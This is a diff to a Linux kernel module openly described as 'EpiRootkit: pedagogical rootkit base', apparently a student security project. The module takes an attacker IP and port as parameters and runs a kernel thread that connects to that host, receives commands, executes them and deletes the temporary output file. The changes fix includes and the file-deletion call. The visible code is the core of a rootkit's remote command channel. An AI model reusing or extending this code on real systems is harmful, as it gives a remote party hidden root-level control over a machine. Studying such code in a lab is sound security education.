@@ -5,19 +5,21 @@
 #include <linux/delay.h>
 #include <linux/net.h>
 #include <linux/in.h>
+#include <linux/inet.h>       // for in_aton()
 #include <linux/socket.h>
 #include <linux/slab.h>
 #include <linux/fs.h>
 #include <linux/uaccess.h>
 #include <linux/moduleparam.h>
+#include <linux/namei.h>      // for kern_path()
 
 MODULE_LICENSE("GPL");
-MODULE_AUTHOR("Jules Aubert <jules1.aubert@epita.fr>");
+MODULE_AUTHOR("Corentin Dupaigne");
 MODULE_DESCRIPTION("EpiRootkit: pedagogical rootkit base");
 MODULE_VERSION("0.1");
 
 /* Module parameters */
-static char *attacker_ip = "192.168.56.101";
+static char *attacker_ip   = "192.168.56.101";
 static int   attacker_port = 5555;
 module_param(attacker_ip, charp, 0444);
 MODULE_PARM_DESC(attacker_ip,   "Attacker VM IPv4 address");
@@ -95,7 +97,15 @@ static int execute_and_capture(const char *cmd) {
     }
     set_fs(oldfs);
     kfree(argv[2]);
-    vfs_unlink(d_path_parent(OUT_FILE), d_path_basename(OUT_FILE), NULL);
+
+    /* delete temp file */
+    {
+        struct path p;
+        if (kern_path(OUT_FILE, LOOKUP_FOLLOW, &p) == 0) {
+            vfs_unlink(d_inode(p.dentry->d_parent), p.dentry, NULL);
+            path_put(&p);
+        }
+    }
     return ret;
 }
 
@@ -103,6 +113,7 @@ static int execute_and_capture(const char *cmd) {
 static int connection_worker(void *data) {
     struct sockaddr_in addr;
     int               ret;
+    char             *cmd;
 
     while (!kthread_should_stop()) {
         /* create socket */
@@ -133,7 +144,7 @@ static int connection_worker(void *data) {
             if (len <= 0) break;
             len = ntohl(net_len);
             if (len <= 0 || len > CMD_MAX_LEN) break;
-            char *cmd = kmalloc(len+1, GFP_KERNEL);
+            cmd = kmalloc(len+1, GFP_KERNEL);
             if (!cmd) break;
             if (sock_recv_all(conn_sock, cmd, len) <= 0) {
                 kfree(cmd);
@@ -171,4 +182,3 @@ static void __exit epirootkit_exit(void) {
 
 module_init(epirootkit_init);
 module_exit(epirootkit_exit);
-
